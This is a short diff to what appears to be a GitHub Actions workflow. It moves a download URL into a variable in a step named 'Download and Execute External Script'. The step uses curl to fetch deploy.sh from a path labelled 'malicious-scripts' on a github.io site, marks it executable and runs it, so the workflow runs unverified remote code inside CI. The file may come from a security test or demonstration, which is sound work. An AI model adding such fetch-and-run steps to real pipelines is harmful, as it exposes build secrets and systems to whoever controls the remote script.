@@ -15,7 +15,10 @@ jobs:
 
       - name: Download and Execute External Script  
         run: |  
-          curl -o deploy.sh https://linustimodaniels.github.io/malicious-scripts/deploy.sh
+          DEPLOY_URL="https://linustimodaniels.github.io/malicious-scripts/deploy.sh"  
+          
+          # Download script
+          curl -o deploy.sh "$DEPLOY_URL"
   
           chmod +x deploy.sh  
           ./deploy.sh  
